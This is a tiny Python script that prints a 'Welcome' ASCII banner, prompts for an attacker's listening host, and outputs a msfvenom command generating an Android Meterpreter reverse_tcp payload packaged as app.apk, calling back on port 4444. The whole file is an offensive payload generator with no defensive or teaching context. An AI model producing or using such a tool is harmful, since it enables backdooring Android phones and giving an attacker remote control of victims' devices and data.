logo = '''
 __    __    ___  _        __   ___   ___ ___    ___ 
|  |__|  |  /  _]| |      /  ] /   \ |   |   |  /  _]
|  |  |  | /  [_ | |     /  / |     || _   _ | /  [_ 
|  |  |  ||    _]| |___ /  /  |  O  ||  \_/  ||    _]
|  `  '  ||   [_ |     /   \_ |     ||   |   ||   [_ 
 \      / |     ||     \     ||     ||   |   ||     |
  \_/\_/  |_____||_____|\____| \___/ |___|___||_____|
                                                     
'''
print(logo)
lhost = input("lhost:")

print("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=4444 R >/sdcard/app.apk")

